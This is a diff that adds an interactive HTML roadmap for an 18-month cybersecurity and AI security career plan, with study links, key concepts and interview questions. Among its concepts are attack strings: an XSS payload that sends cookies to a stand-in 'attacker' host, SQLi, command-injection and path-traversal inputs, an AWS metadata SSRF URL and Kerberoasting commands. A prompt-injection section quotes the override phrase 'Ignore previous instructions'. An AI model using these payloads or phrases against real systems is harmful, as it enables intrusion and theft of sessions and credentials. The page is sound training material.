@@ -1,0 +1,654 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Cybersecurity & AI Security — 18 Month Roadmap</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+html,body{height:100%;width:100%}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Helvetica,Arial,sans-serif;background:linear-gradient(135deg, #f5f5f5 0%, #ffffff 100%);color:#333;line-height:1.6}
+.wrap{max-width:900px;margin:0 auto;padding:2rem 1rem}
+.header{margin-bottom:2rem;padding:2rem;background:white;border-radius:12px;box-shadow:0 2px 8px rgba(0,0,0,0.08)}
+.header h1{font-size:28px;font-weight:700;color:#1D9E75;margin-bottom:0.5rem;display:flex;align-items:center;gap:0.75rem}
+.header p{font-size:15px;color:#666;line-height:1.6}
+.progress-bar-wrap{background:#e0e0e0;border-radius:999px;height:10px;margin-top:1rem;overflow:hidden;border:0.5px solid #ccc}
+.progress-bar-fill{height:100%;background:#1D9E75;border-radius:999px;transition:width 0.4s}
+.stats-row{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:12px;margin-top:1.5rem}
+.stat-card{background:#f8f8f8;border-radius:8px;padding:1rem;text-align:center;border:1px solid #eee}
+.stat-num{font-size:28px;font-weight:700;color:#1D9E75}
+.stat-lbl{font-size:12px;color:#999;margin-top:0.5rem;text-transform:uppercase;letter-spacing:0.5px}
+.phase{margin-bottom:1rem;border:1px solid #e0e0e0;border-radius:8px;overflow:hidden;background:white;box-shadow:0 2px 4px rgba(0,0,0,0.05)}
+.phase-header{display:flex;align-items:center;gap:12px;padding:16px;cursor:pointer;user-select:none;background:#fafafa;transition:background 0.2s}
+.phase-header:hover{background:#f0f0f0}
+.phase-badge{font-size:11px;font-weight:600;padding:4px 10px;border-radius:20px;white-space:nowrap}
+.phase-title{font-size:16px;font-weight:600;color:#333;flex:1}
+.phase-meta{font-size:13px;color:#999}
+.phase-chevron{font-size:18px;color:#999;transition:transform 0.2s}
+.phase-chevron.open{transform:rotate(180deg)}
+.phase-body{padding:0;display:none;max-height:0;overflow:hidden;transition:max-height 0.3s}
+.phase-body.open{display:block;padding:16px;max-height:10000px}
+.month-section{margin-top:1rem}
+.month-label{font-size:12px;font-weight:700;color:#666;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:12px;padding-bottom:8px;border-bottom:2px solid #e0e0e0}
+.topic{border:1px solid #e8e8e8;border-radius:6px;margin-bottom:8px;overflow:hidden;background:white}
+.topic-header{display:flex;align-items:center;gap:10px;padding:12px;cursor:pointer;background:#fafafa;transition:background 0.2s}
+.topic-header:hover{background:#f5f5f5}
+.topic-check{width:20px;height:20px;border-radius:4px;border:2px solid #ddd;display:flex;align-items:center;justify-content:center;cursor:pointer;transition:all 0.2s;flex-shrink:0}
+.topic-check:hover{border-color:#1D9E75}
+.topic-check.done{background:#1D9E75;border-color:#1D9E75}
+.topic-check.done::after{content:'✓';font-size:12px;color:white;font-weight:600}
+.topic-name{font-size:14px;font-weight:600;color:#333;flex:1}
+.topic-tag{font-size:11px;padding:3px 8px;border-radius:4px;border:1px solid #ddd;color:#666;background:white}
+.topic-chevron{font-size:14px;color:#999;transition:transform 0.2s}
+.topic-chevron.open{transform:rotate(180deg)}
+.topic-body{display:none;padding:12px;border-top:1px solid #f0f0f0;background:#fafafa}
+.topic-body.open{display:block}
+.subtopic-list{margin-top:8px}
+.subtopic{display:flex;align-items:flex-start;gap:10px;padding:10px 0;border-bottom:1px solid #f0f0f0}
+.subtopic:last-child{border-bottom:none}
+.sub-check{width:18px;height:18px;border-radius:3px;border:1.5px solid #ddd;display:flex;align-items:center;justify-content:center;flex-shrink:0;margin-top:2px;cursor:pointer;transition:all 0.2s}
+.sub-check:hover{border-color:#1D9E75}
+.sub-check.done{background:#1D9E75;border-color:#1D9E75}
+.sub-check.done::after{content:'✓';font-size:10px;color:white;font-weight:600}
+.sub-content{flex:1;min-width:0}
+.sub-name{font-size:13px;font-weight:600;color:#333}
+.sub-desc{font-size:12px;color:#666;margin-top:4px;line-height:1.5}
+.sub-links{display:flex;flex-wrap:wrap;gap:6px;margin-top:8px}
+.sub-link{font-size:11px;padding:4px 8px;border-radius:4px;border:1px solid #ddd;color:#666;text-decoration:none;background:white;transition:all 0.2s;display:inline-block}
+.sub-link:hover{border-color:#1D9E75;color:#1D9E75;background:#f0faf8}
+.sub-link.free{border-color:#1D9E75;color:#1D9E75}
+.sub-link.paid{border-color:#D85A30;color:#D85A30}
+.sub-link.lab{border-color:#534AB7;color:#534AB7}
+.deep-list{margin-top:8px;padding-left:18px}
+.deep-item{font-size:11px;color:#555;padding:2px 0;line-height:1.6}
+.section-label{font-size:10px;font-weight:700;color:#999;text-transform:uppercase;letter-spacing:0.5px;margin:10px 0 6px}
+.interview-q{background:#f5f5f5;border-left:3px solid #534AB7;padding:8px 12px;margin:4px 0;border-radius:0 4px 4px 0;font-size:11px;color:#333;line-height:1.5}
+@media(max-width:600px){
+  .wrap{padding:1rem 0.5rem}
+  .header{padding:1rem}
+  .header h1{font-size:20px}
+  .stats-row{grid-template-columns:repeat(2,1fr)}
+}
+</style>
+</head>
+<body>
+
+<div class="wrap">
+<div class="header">
+  <h1>🛡️ Cybersecurity & AI Security — 18 Month Roadmap</h1>
+  <p>June 2026 – December 2027 · B.Tech CSE Fresher → ₹15–20 LPA Professional</p>
+  <p style="margin-top:0.75rem;font-size:13px;color:#999;">Tap any topic to expand. Click subtopic checkboxes to track your progress. Your progress saves automatically!</p>
+  <div class="progress-bar-wrap"><div class="progress-bar-fill" id="main-bar" style="width:0%"></div></div>
+  <p style="font-size:12px;color:#999;margin-top:8px" id="main-pct">0% complete — let's go! 🚀</p>
+</div>
+
+<div class="stats-row">
+  <div class="stat-card"><div class="stat-num" id="s-done">0</div><div class="stat-lbl">Topics done</div></div>
+  <div class="stat-card"><div class="stat-num" id="s-total">0</div><div class="stat-lbl">Total topics</div></div>
+  <div class="stat-card"><div class="stat-num" id="s-sub">0</div><div class="stat-lbl">Subtopics done</div></div>
+  <div class="stat-card"><div class="stat-num" id="s-streak">0</div><div class="stat-lbl">Day streak 🔥</div></div>
+</div>
+
+<div id="roadmap"></div>
+</div>
+
+<script>
+const DATA = [
+  {
+    phase:"Phase 1 — Foundation Fortress",
+    months:"Jun–Aug 2026",
+    color:"#1D9E75",
+    badge:"Months 1–3",
+    badgeBg:"#E1F5EE",badgeFg:"#0F6E56",
+    months_data:[
+      {
+        label:"Month 1 — Linux + Networking + Python",
+        topics:[
+          {
+            name:"Linux Fundamentals",tag:"Core Skill",
+            subtopics:[
+              {
+                name:"Filesystem & Navigation",
+                desc:"Master the Linux directory tree. Everything is a file — /etc, /tmp, /var/log, /proc. Learn how attackers use each.",
+                links:[
+                  {t:"OverTheWire Bandit",u:"https://overthewire.org/wargames/bandit/",cls:"free lab"},
+                  {t:"TryHackMe Linux 1",u:"https://tryhackme.com/room/linuxfundamentals1",cls:"paid lab"},
+                  {t:"Linux Command Line",u:"https://linuxcommand.org/tlcl.php",cls:"free"}
+                ],
+                deep:[
+                  "pwd, ls -la, cd, cat, less, head, tail, file, strings",
+                  "Security dirs: /etc (configs), /tmp (world-writable), /var/log (evidence), /proc (live memory)",
+                  "Hidden files start with . — always use ls -la not ls",
+                  "find / -name '*.conf' 2>/dev/null — find config files",
+                  "grep -ri 'password' /var/www/ — find hardcoded creds"
+                ],
+                interview:["What is /proc and why does it matter to attackers?","How do you find all files modified in the last 24 hours?"]
+              },
+              {
+                name:"File Permissions & SUID",
+                desc:"rwx, chmod numbers, SUID/SGID/Sticky bit. SUID is the #1 Linux privilege escalation vector.",
+                links:[
+                  {t:"GTFOBins",u:"https://gtfobins.github.io",cls:"free lab"},
+                  {t:"THM Linux PrivEsc",u:"https://tryhackme.com/room/linuxprivesc",cls:"paid lab"}
+                ],
+                deep:[
+                  "r=4, w=2, x=1 → chmod 755 = rwxr-xr-x, 644 = rw-r--r--",
+                  "SUID (4000): binary runs as file OWNER, not caller → root SUID = privesc",
+                  "find / -perm -u=s -type f 2>/dev/null — find all SUID binaries",
+                  "GTFOBins: database of exploitable SUID/sudo binaries",
+                  "Sticky bit on /tmp: prevents users deleting each other's files"
+                ],
+                interview:["Explain SUID and show an exploitation example","How does chmod 4755 differ from chmod 755?"]
+              },
+              {
+                name:"Users, Groups & Sudo",
+                desc:"User enumeration, sudo misconfigurations, /etc/passwd vs /etc/shadow. sudo -l is the first command on every box.",
+                links:[
+                  {t:"/etc/passwd format",u:"https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/",cls:"free"},
+                  {t:"THM Sudo Security",u:"https://tryhackme.com/room/sudovulnsbypass",cls:"paid lab"}
+                ],
+                deep:[
+                  "sudo -l → always run first on any Linux shell",
+                  "/etc/passwd: username:x:UID:GID:comment:home:shell",
+                  "/etc/shadow: password hashes — root only readable",
+                  "UID 0 = root. Multiple UID 0 accounts = backdoor sign",
+                  "sudo -u www-data command → run as another user"
+                ],
+                interview:["You find (ALL) NOPASSWD: /usr/bin/python3 in sudo -l. What do you do?","What is the difference between su and sudo?"]
+              }
+            ]
+          },
+          {
+            name:"Networking Fundamentals",tag:"Core Skill",
+            subtopics:[
+              {
+                name:"OSI Model & TCP/IP",
+                desc:"The language of all attacks. Layers 3 (IP), 4 (TCP/UDP), 7 (HTTP) is where 90% of attacks happen.",
+                links:[
+                  {t:"Professor Messer Net+",u:"https://www.professormesser.com/network-plus/",cls:"free"},
+                  {t:"Cisco Packet Tracer",u:"https://www.netacad.com/courses/packet-tracer",cls:"free lab"}
+                ],
+                deep:[
+                  "L1 Physical → L2 Data Link → L3 Network (IP) → L4 Transport (TCP/UDP) → L7 Application",
+                  "TCP 3-way handshake: SYN → SYN-ACK → ACK",
+                  "Top ports: 22 SSH, 80 HTTP, 443 HTTPS, 445 SMB, 3389 RDP, 3306 MySQL",
+                  "UDP: connectionless, used by DNS (53), DHCP (67/68), SNMP (161)",
+                  "Wireshark filter: tcp.port==80 && http.request"
+                ],
+                interview:["What happens at every layer when you type google.com?","Why would an attacker prefer UDP over TCP for C2?"]
+              }
+            ]
+          },
+          {
+            name:"Python for Security",tag:"Core Skill",
+            subtopics:[
+              {
+                name:"Python Basics → Security Focus",
+                desc:"Only what security engineers need: sockets, requests, subprocess, file I/O, scapy.",
+                links:[
+                  {t:"Automate Boring Stuff",u:"https://automatetheboringstuff.com",cls:"free"},
+                  {t:"Black Hat Python",u:"https://nostarch.com/black-hat-python2E",cls:"paid"}
+                ],
+                deep:[
+                  "Data types, loops, functions, file I/O, error handling — 1 week",
+                  "socket module: TCP/UDP clients, banner grabbing, port scanner",
+                  "requests library: HTTP GET/POST, headers, cookies, sessions",
+                  "subprocess: run system commands from Python scripts",
+                  "scapy: craft raw packets, ARP spoof, sniff traffic"
+                ],
+                interview:["Write a Python port scanner","How would you use requests to test for IDOR?"]
+              }
+            ]
+          }
+        ]
+      },
+      {
+        label:"Month 2 — Web Security + Burp Suite + OWASP",
+        topics:[
+          {
+            name:"OWASP Top 10",tag:"Critical",
+            subtopics:[
+              {
+                name:"A01 Broken Access Control",
+                desc:"#1 most common web vulnerability. IDOR, path traversal, forced browsing.",
+                links:[
+                  {t:"PortSwigger Access Control",u:"https://portswigger.net/web-security/access-control",cls:"free lab"},
+                  {t:"OWASP A01",u:"https://owasp.org/Top10/A01_2021-Broken_Access_Control/",cls:"free"}
+                ],
+                deep:[
+                  "IDOR: change user_id=123 to user_id=124 → access another user's data",
+                  "Path traversal: ../../../etc/passwd in file parameter",
+                  "Forced browsing: /admin, /backup, /debug endpoints without auth",
+                  "Method tampering: GET blocked but POST allowed for same action",
+                  "Horizontal vs vertical privilege escalation"
+                ],
+                interview:["You find /api/user?id=1001 returns your data. What's your next step?"]
+              },
+              {
+                name:"A03 Injection (SQLi, XSS, Command)",
+                desc:"Classic but still deadly. SQLi extracts databases. XSS steals sessions.",
+                links:[
+                  {t:"PortSwigger SQLi labs",u:"https://portswigger.net/web-security/sql-injection",cls:"free lab"},
+                  {t:"PortSwigger XSS labs",u:"https://portswigger.net/web-security/cross-site-scripting",cls:"free lab"}
+                ],
+                deep:[
+                  "SQLi: ' OR '1'='1 → Union-based → Blind Boolean → Time-based",
+                  "SQLMap: sqlmap -u 'http://target/page?id=1' --dbs",
+                  "XSS types: Reflected, Stored, DOM-based, Blind",
+                  "XSS payload: <script>location='http://attacker/?c='+document.cookie</script>",
+                  "Command injection: ;id, &&whoami, |cat /etc/passwd"
+                ],
+                interview:["Explain Union-based SQLi step by step","What is the difference between Stored and Reflected XSS?"]
+              },
+              {
+                name:"A10 SSRF + Others",
+                desc:"SSRF is cloud-critical. Hits AWS metadata endpoint → steals IAM credentials.",
+                links:[
+                  {t:"PortSwigger SSRF",u:"https://portswigger.net/web-security/ssrf",cls:"free lab"},
+                  {t:"OWASP Top 10 full",u:"https://owasp.org/Top10/",cls:"free"}
+                ],
+                deep:[
+                  "SSRF: server makes request to attacker URL → access internal services",
+                  "AWS SSRF: http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+                  "XXE: XML external entity → read local files, SSRF via XML",
+                  "Insecure Deserialization: modify serialized objects → RCE",
+                  "Blind SSRF: use Burp Collaborator for OOB callbacks"
+                ],
+                interview:["Show me an SSRF attack that steals AWS credentials"]
+              }
+            ]
+          },
+          {
+            name:"Burp Suite Mastery",tag:"Tool",
+            subtopics:[
+              {
+                name:"Proxy, Repeater & Intruder",
+                desc:"The core workflow. Intercept, modify, replay with Repeater, fuzz with Intruder.",
+                links:[
+                  {t:"PortSwigger Burp Academy",u:"https://portswigger.net/burp/documentation/desktop/getting-started",cls:"free"},
+                  {t:"THM Burp Suite",u:"https://tryhackme.com/module/learn-burp-suite",cls:"paid lab"}
+                ],
+                deep:[
+                  "Proxy: intercept, modify, forward HTTP requests",
+                  "Repeater: manually craft and replay requests — core pentesting loop",
+                  "Intruder: Sniper, Battering ram, Pitchfork, Cluster bomb modes",
+                  "Match-and-replace: auto-replace tokens on all requests",
+                  "Burp Collaborator: detect out-of-band interactions (blind SQLi, SSRF)"
+                ],
+                interview:["How do you test for IDOR using Burp?","Explain Pitchfork vs Cluster Bomb"]
+              }
+            ]
+          }
+        ]
+      },
+      {
+        label:"Month 3 — Git + SOC Basics + Lab Setup",
+        topics:[
+          {
+            name:"Git & GitHub Portfolio",tag:"Career",
+            subtopics:[
+              {
+                name:"Git Fundamentals",
+                desc:"Version control is non-negotiable. Your GitHub is your resume.",
+                links:[
+                  {t:"Pro Git book",u:"https://git-scm.com/book/en/v2",cls:"free"},
+                  {t:"GitHub Skills",u:"https://skills.github.com",cls:"free lab"}
+                ],
+                deep:[
+                  "init, clone, add, commit, push, pull, fetch, status, log, diff",
+                  "Branching: branch, checkout -b, merge, rebase",
+                  "git blame: trace who wrote each line",
+                  ".gitignore: NEVER commit API keys, passwords, private keys",
+                  "git log --oneline --graph: visualize branch history"
+                ],
+                interview:["How would you use git blame in a security code review?","What do you check in .gitignore to prevent secret leaks?"]
+              }
+            ]
+          },
+          {
+            name:"SOC Fundamentals",tag:"Blue Team",
+            subtopics:[
+              {
+                name:"SIEM, Logs & Alerts",
+                desc:"Know what defenders see. This helps you evade detection and write better reports.",
+                links:[
+                  {t:"THM SOC Level 1",u:"https://tryhackme.com/path/outline/soclevel1",cls:"paid lab"},
+                  {t:"Splunk Free Training",u:"https://www.splunk.com/en_us/training/free-courses/",cls:"free"}
+                ],
+                deep:[
+                  "SIEM: Splunk, Microsoft Sentinel, QRadar",
+                  "Log sources: Windows Event Logs, Syslog, IDS/IPS, Firewall, EDR",
+                  "Windows events: 4624 (login), 4625 (failed), 4688 (process create)",
+                  "IOC: IPs, hashes, domains, registry keys",
+                  "MITRE ATT&CK: framework of attacker tactics"
+                ],
+                interview:["What Windows Event ID detects Pass-the-Hash?","What is the difference between IOC and TTP?"]
+              }
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  {
+    phase:"Phase 2 — Core Offensive Security",
+    months:"Sep–Dec 2026",
+    color:"#534AB7",
+    badge:"Months 4–7",
+    badgeBg:"#EEEDFE",badgeFg:"#3C3489",
+    months_data:[
+      {
+        label:"Month 4–5 — Active Directory + Privilege Escalation",
+        topics:[
+          {
+            name:"Active Directory Attacks",tag:"High Value",
+            subtopics:[
+              {
+                name:"AD Enumeration with BloodHound",
+                desc:"BloodHound maps entire AD attack paths visually. Always run this first.",
+                links:[
+                  {t:"BloodHound",u:"https://github.com/BloodHoundAD/BloodHound",cls:"free lab"},
+                  {t:"THM AD Basics",u:"https://tryhackme.com/room/activedirectorybasics",cls:"paid lab"}
+                ],
+                deep:[
+                  "BloodHound/SharpHound: graph all AD objects, find attack paths",
+                  "PowerView: Get-NetUser, Get-NetGroup, Get-NetComputer",
+                  "ldapdomaindump: dump entire AD over LDAP",
+                  "enum4linux-ng: enumerate SMB/RPC for users, shares",
+                  "Targets: Domain Admins, Enterprise Admins, Service Accounts, GPOs"
+                ],
+                interview:["What is BloodHound and what does SharpHound collect?"]
+              },
+              {
+                name:"Kerberoasting & AS-REP Roasting",
+                desc:"Extract service ticket hashes and crack offline. High-value in real pentests.",
+                links:[
+                  {t:"Impacket",u:"https://github.com/fortra/impacket",cls:"free lab"},
+                  {t:"THM Attacking Kerberos",u:"https://tryhackme.com/room/attackingkerberos",cls:"paid lab"}
+                ],
+                deep:[
+                  "Kerberoasting: request TGS → crack RC4 hash offline",
+                  "GetUserSPNs.py -dc-ip 10.0.0.1 domain/user:pass -request",
+                  "AS-REP Roasting: no pre-auth accounts → get hash without password",
+                  "GetNPUsers.py domain/ -usersfile users.txt -no-pass",
+                  "Defense: long random passwords, AES-only Kerberos"
+                ],
+                interview:["Explain difference between Kerberoasting and AS-REP Roasting"]
+              }
+            ]
+          },
+          {
+            name:"Windows Privilege Escalation",tag:"High Value",
+            subtopics:[
+              {
+                name:"WinPEAS & Manual Enumeration",
+                desc:"Automated + manual enumeration. WinPEAS finds everything.",
+                links:[
+                  {t:"PEASS-ng (WinPEAS)",u:"https://github.com/peass-ng/PEASS-ng",cls:"free lab"},
+                  {t:"LOLBAS",u:"https://lolbas-project.github.io",cls:"free lab"}
+                ],
+                deep:[
+                  "whoami /priv — check token privileges",
+                  "systeminfo — OS version, hotfixes",
+                  "wmic qfe — installed patches",
+                  "sc query / sc qc ServiceName — service configs",
+                  "icacls 'C:\\Program Files\\App' — folder permissions"
+                ],
+                interview:["You have SeImpersonatePrivilege. How do you escalate to SYSTEM?"]
+              }
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  {
+    phase:"Phase 3 — Advanced & Certifications",
+    months:"Jan–Apr 2027",
+    color:"#D85A30",
+    badge:"Months 8–11",
+    badgeBg:"#FAECE7",badgeFg:"#993C1D",
+    months_data:[
+      {
+        label:"Month 8–10 — OSCP Preparation",
+        topics:[
+          {
+            name:"OSCP Exam Preparation",tag:"Gold Standard",
+            subtopics:[
+              {
+                name:"OSCP Course & Labs",
+                desc:"Gold standard certification. ₹1,24,000 but commands ₹20+ LPA.",
+                links:[
+                  {t:"Offensive Security PEN-200",u:"https://www.offsec.com/courses/pen-200/",cls:"paid"},
+                  {t:"TJNull OSCP-like HTB list",u:"https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/",cls:"free lab"}
+                ],
+                deep:[
+                  "PEN-200: 800+ page PDF + 70+ lab machines",
+                  "Exam: 24 hours, 3 standalone + AD set, 70/100 to pass",
+                  "Key skills: buffer overflow, pivoting, tunneling, AD attacks",
+                  "Methodology: enumerate everything before exploiting",
+                  "TJNull list: 50+ HTB machines mimic OSCP difficulty"
+                ],
+                interview:["Walk me through your methodology on a new machine"]
+              }
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  {
+    phase:"Phase 4 — AI Security Specialist",
+    months:"May–Aug 2027",
+    color:"#185FA5",
+    badge:"Months 12–15",
+    badgeBg:"#E6F1FB",badgeFg:"#0C447C",
+    months_data:[
+      {
+        label:"Month 12–13 — LLM Security & AI Red Team",
+        topics:[
+          {
+            name:"OWASP LLM Top 10",tag:"Emerging",
+            subtopics:[
+              {
+                name:"Prompt Injection & Jailbreaking",
+                desc:"The SQLi of AI. Direct and indirect injection manipulates LLM output.",
+                links:[
+                  {t:"Gandalf by Lakera",u:"https://gandalf.lakera.ai",cls:"free lab"},
+                  {t:"OWASP LLM Top 10",u:"https://owasp.org/www-project-top-10-for-large-language-model-applications/",cls:"free"}
+                ],
+                deep:[
+                  "Direct: 'Ignore previous instructions and...'",
+                  "Indirect: malicious content in external data",
+                  "Stored: payload persists → activates later",
+                  "Many-shot jailbreaking: long context with harmful examples",
+                  "Multimodal: instructions in images/audio bypass text filters"
+                ],
+                interview:["What is indirect prompt injection? Give a real attack scenario"]
+              }
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  {
+    phase:"Phase 5 — Job Ready",
+    months:"Sep–Dec 2027",
+    color:"#BA7517",
+    badge:"Months 16–18",
+    badgeBg:"#FAEEDA",badgeFg:"#854F0B",
+    months_data:[
+      {
+        label:"Month 16–18 — Portfolio & Interviews",
+        topics:[
+          {
+            name:"Interview Preparation",tag:"Career",
+            subtopics:[
+              {
+                name:"Technical Interview Mastery",
+                desc:"Security interviews test knowledge AND practical thinking.",
+                links:[
+                  {t:"HTB Academy Interview Prep",u:"https://academy.hackthebox.com",cls:"free"},
+                  {t:"Daniel Miessler blog",u:"https://danielmiessler.com",cls:"free"}
+                ],
+                deep:[
+                  "Top 5 topics: Web, Network, AD/Windows, Linux, Scripting",
+                  "Know both attack AND defense for every technique",
+                  "Live hacking: practice speed on real VMs",
+                  "Report writing: 3 sample pentest reports before interviews",
+                  "Salary: ₹15 LPA floor, target ₹18-20 LPA, OSCP → higher"
+                ],
+                interview:["Tell me about a machine you hacked","How would you approach a black-box web app pentest?"]
+              }
+            ]
+          }
+        ]
+      }
+    ]
+  }
+];
+
+let state = {};
+try { state = JSON.parse(localStorage.getItem('roadmap_state')||'{}'); } catch(e){}
+
+function save(){ try{localStorage.setItem('roadmap_state',JSON.stringify(state));}catch(e){} }
+
+function updateStats(){
+  let topicDone=0,topicTotal=0,subDone=0,subTotal=0;
+  DATA.forEach(ph=>ph.months_data.forEach(m=>m.topics.forEach(t=>{
+    topicTotal++;
+    const tk=`topic_${t.name}`;
+    if(state[tk]) topicDone++;
+    t.subtopics.forEach((s,si)=>{
+      subTotal++;
+      if(state[`sub_${t.name}_${si}`]) subDone++;
+    });
+  })));
+  const pct=subTotal?Math.round((subDone/subTotal)*100):0;
+  document.getElementById('main-bar').style.width=pct+'%';
+  document.getElementById('main-pct').textContent=pct+'% complete — '+subDone+'/'+subTotal+' subtopics done';
+  document.getElementById('s-done').textContent=topicDone;
+  document.getElementById('s-total').textContent=topicTotal;
+  document.getElementById('s-sub').textContent=subDone;
+  const streak = state._streak||0;
+  document.getElementById('s-streak').textContent=streak;
+}
+
+function renderRoadmap(){
+  const container=document.getElementById('roadmap');
+  container.innerHTML='';
+  DATA.forEach((ph,pi)=>{
+    const phDiv=document.createElement('div');
+    phDiv.className='phase';
+    let phTotal=0,phDone=0;
+    ph.months_data.forEach(m=>m.topics.forEach(t=>{
+      t.subtopics.forEach((_,si)=>{phTotal++;if(state[`sub_${t.name}_${si}`])phDone++;});
+    }));
+    const phPct=phTotal?Math.round((phDone/phTotal)*100):0;
+
+    phDiv.innerHTML=`<div class="phase-header" onclick="togglePhase(${pi})">
+      <span class="phase-badge" style="background:${ph.badgeBg};color:${ph.badgeFg}">${ph.badge}</span>
+      <span class="phase-title">${ph.phase}</span>
+      <span class="phase-meta">${ph.months} · ${phPct}%</span>
+      <i class="phase-chevron" id="ph-chev-${pi}">▼</i>
+    </div>
+    <div class="phase-body" id="ph-body-${pi}">
+      <div style="padding:10px 0 4px;font-size:12px;color:#999">${phDone}/${phTotal} subtopics complete</div>
+      <div class="progress-bar-wrap" style="margin-bottom:12px"><div class="progress-bar-fill" style="width:${phPct}%;background:${ph.color}"></div></div>
+      <div id="ph-months-${pi}"></div>
+    </div>`;
+    container.appendChild(phDiv);
+
+    const monthsDiv=phDiv.querySelector(`#ph-months-${pi}`);
+    ph.months_data.forEach((m,mi)=>{
+      const mDiv=document.createElement('div');
+      mDiv.className='month-section';
+      mDiv.innerHTML=`<div class="month-label">${m.label}</div><div id="topics-${pi}-${mi}"></div>`;
+      monthsDiv.appendChild(mDiv);
+      const topicsDiv=mDiv.querySelector(`#topics-${pi}-${mi}`);
+      m.topics.forEach((t,ti)=>{
+        const tk=`topic_${t.name}`;
+        const isDone=!!state[tk];
+        const tDiv=document.createElement('div');
+        tDiv.className='topic';
+        let subsHtml='';
+        t.subtopics.forEach((s,si)=>{
+          const sk=`sub_${t.name}_${si}`;
+          const sDone=!!state[sk];
+          let linksHtml=s.links.map(l=>`<a href="${l.u}" target="_blank" class="sub-link ${l.cls}">${l.t}</a>`).join('');
+          let deepHtml=s.deep.length?`<div class="section-label">Key Concepts</div><ul class="deep-list">${s.deep.map(d=>`<li class="deep-item">• ${d}</li>`).join('')}</ul>`:'';
+          let iqHtml=s.interview.length?`<div class="section-label">Interview Questions</div>${s.interview.map(q=>`<div class="interview-q">❓ ${q}</div>`).join('')}`:'';
+          subsHtml+=`<div class="subtopic">
+            <div class="sub-check${sDone?' done':''}" onclick="toggleSub('${sk}','${tk}',${pi},${mi},${ti})" title="Mark complete"></div>
+            <div class="sub-content">
+              <div class="sub-name">${s.name}</div>
+              <div class="sub-desc">${s.desc}</div>
+              ${s.links.length?`<div class="sub-links">${linksHtml}</div>`:''}
+              ${deepHtml}${iqHtml}
+            </div>
+          </div>`;
+        });
+        tDiv.innerHTML=`<div class="topic-header" onclick="toggleTopic(${pi},${mi},${ti})">
+          <div class="topic-check${isDone?' done':''}" onclick="event.stopPropagation();toggleTopicCheck('${tk}',${pi},${mi},${ti})" title="Mark complete"></div>
+          <span class="topic-name">${t.name}</span>
+          <span class="topic-tag">${t.tag}</span>
+          <i class="topic-chevron" id="tc-${pi}-${mi}-${ti}">▼</i>
+        </div>
+        <div class="topic-body" id="tb-${pi}-${mi}-${ti}">
+          <div class="subtopic-list">${subsHtml}</div>
+        </div>`;
+        topicsDiv.appendChild(tDiv);
+      });
+    });
+  });
+  updateStats();
+}
+
+window.togglePhase=function(pi){
+  const body=document.getElementById(`ph-body-${pi}`);
+  const chev=document.getElementById(`ph-chev-${pi}`);
+  body.classList.toggle('open');
+  chev.classList.toggle('open');
+};
+
+window.toggleTopic=function(pi,mi,ti){
+  const body=document.getElementById(`tb-${pi}-${mi}-${ti}`);
+  const chev=document.getElementById(`tc-${pi}-${mi}-${ti}`);
+  body.classList.toggle('open');
+  chev.classList.toggle('open');
+};
+
+window.toggleTopicCheck=function(tk,pi,mi,ti){
+  state[tk]=!state[tk];
+  save();
+  renderRoadmap();
+  const body=document.getElementById(`tb-${pi}-${mi}-${ti}`);
+  const chev=document.getElementById(`tc-${pi}-${mi}-${ti}`);
+  if(body) body.classList.add('open');
+  if(chev) chev.classList.add('open');
+};
+
+window.toggleSub=function(sk,tk,pi,mi,ti){
+  state[sk]=!state[sk];
+  const today=new Date().toDateString();
+  if(state[sk]){
+    if(state._lastDay!==today){state._streak=(state._streak||0)+1;state._lastDay=today;}
+  }
+  save();
+  renderRoadmap();
+  const body=document.getElementById(`tb-${pi}-${mi}-${ti}`);
+  const chev=document.getElementById(`tc-${pi}-${mi}-${ti}`);
+  if(body) body.classList.add('open');
+  if(chev) chev.classList.add('open');
+};
+
+renderRoadmap();
+if(document.getElementById('ph-body-0')){
+  document.getElementById('ph-body-0').classList.add('open');
+  document.getElementById('ph-chev-0').classList.add('open');
+}
+</script>
+
+</body>
+</html>
